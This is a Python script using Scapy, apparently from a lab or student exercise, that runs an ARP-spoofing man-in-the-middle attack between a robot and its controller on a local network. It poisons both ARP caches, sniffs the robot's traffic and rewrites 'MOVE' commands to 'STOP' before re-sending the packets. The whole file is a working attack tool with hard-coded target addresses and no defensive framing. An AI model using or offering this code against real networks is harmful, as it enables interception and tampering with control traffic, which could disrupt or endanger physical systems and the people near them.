from scapy.all import *
import time
import os

# --- SETTINGS ---
robot_ip = "10.3.141.194" # pinky
controller_ip = "10.3.141.78"
interface = "wlan0" # verify that the wlan is the correct interface

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, host_ip, target_mac):
    # Sends a fake ARP response: "I am at <host_ip>, and my MAC is <my_mac>"
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    send(packet, verbose=False)

def modify_packet(pkt):
    # Only look at packets with data (Raw layer)
    if pkt.haslayer(Raw) and pkt.haslayer(IP):
        payload = pkt[Raw].load.decode(errors='ignore')
        
        # LAYER 5 TRIGGER: Target a specific command string
        if "MOVE" in payload:
            print(f"[!] Intercepted: {payload}")
            
            # MODIFY: Change MOVE to STOP
            new_payload = payload.replace("MOVE", "STOP")
            pkt[Raw].load = new_payload
            
            # CRITICAL: Delete lengths and checksums so Scapy recalculates them
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[TCP].chksum
            
            send(pkt, verbose=False)
            print(f"[*] Injected: {new_payload}")
        else:
            # Forward legitimate packets untouched
            send(pkt, verbose=False)

# 1. Get MACs
print("[*] Locating targets...")
#robot_mac = get_mac(robot_ip)
#controller_mac = get_mac(controller_ip)
robot_mac = "d8:3a:dd:6d:da:0c" #pinky
controller_mac = "08:00:27:c6:17:fd"

# 2. Start the Attack
try:
    print("[*] Starting MitM... Press Ctrl+C to stop.")
    while True:
        # Poison both directions
        spoof(robot_ip, controller_ip, robot_mac)
        spoof(controller_ip, robot_ip, controller_mac)
        
        # Sniff and Process for 2 seconds
        sniff(iface=interface, filter=f"ip host {robot_ip}", prn=modify_packet, timeout=2)
except KeyboardInterrupt:
    print("\n[*] Re-aligning ARP tables and exiting...")
    # Send correct ARP info to fix the network
    send(ARP(op=2, pdst=robot_ip, hwdst=robot_mac, psrc=controller_ip, hwsrc=controller_mac), count=5)
    send(ARP(op=2, pdst=controller_ip, hwdst=controller_mac, psrc=robot_ip, hwsrc=robot_mac), count=5)